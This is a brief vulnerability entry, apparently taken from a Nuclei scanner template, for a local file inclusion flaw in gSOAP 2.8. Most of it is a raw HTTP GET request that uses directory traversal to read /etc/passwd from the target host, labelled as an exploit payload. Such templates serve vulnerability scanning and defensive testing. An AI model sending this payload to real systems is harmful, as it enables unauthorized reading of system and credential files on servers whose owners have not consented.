# Vulnerability: gSOAP 2.8 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`gsoap-lfi.yaml`)

## Description
gSOAP 2.8 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

